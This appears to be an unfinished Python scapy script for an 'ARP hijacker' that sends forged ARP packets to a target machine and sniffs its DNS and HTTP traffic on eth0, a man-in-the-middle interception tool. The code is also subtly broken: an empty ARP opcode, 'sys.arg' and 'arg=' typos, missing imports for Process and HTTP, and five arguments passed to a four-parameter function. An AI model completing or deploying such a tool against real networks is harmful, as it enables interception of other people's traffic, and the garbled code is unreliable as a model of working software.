from scapy.all import *
from scapy.layers.dns import DNS
from scapy.layers.inet import UDP, TCP, IP
from scapy.layers.l2 import Ether, ARP

import time
import logging

import coloredlogs

INTERFACE = "eth0"


def arp_main( src_hw_addr: str, target_hw_addr: str, target_ip_addr: str, gw_hw_addr:str) -> None:
    while True:
        p = Ether(dst=target_hw_addr, src=src_hw_addr) / ARP(op="")
        sendp(p)
        time.sleep(1.0)

def on_dns_packet(p: Packet) -> None:
    logging.info(f"handling DNS request")
    p.show()

def on_http_packet(p: Packet) -> None:
    logging.info(f"handling HTTP packet")
    

def on_packet(p: Packet) -> None:
    # if UDP in p and p[UDP].dpor === 53
    if UDP in p and DNS in p:
        on_dns_packet(p)
    if UDP in p and HTTP in p:
        on_http_packet(p)
    
        
    
    
def main() -> None:
    src_hw_addr = sys.argv[1]
    target_hw_addr = sys.argv[2]
    gw_hw_addr = sys.arg[3]
    target_ip_addr = sys.argv[4]
    gw_ip_addr = sys.argv[5]
    
    coloredlogs.install(level="INFO")
    
    
    logging.info(f"starting ARP hijacker on {INTERFACE}")
    p = Process(target=arp_main, arg=(src_hw_addr, target_hw_addr, gw_hw_addr, target_ip_addr, gw_ip_addr))
    p.start()
    
    logging.info(f"starting sniffer on {INTERFACE}")
    sniff(quiet=True, store=False, iface=INTERFACE, prn=on_packet)
    p.join()


    
if __name__ == "__main__":
    main()
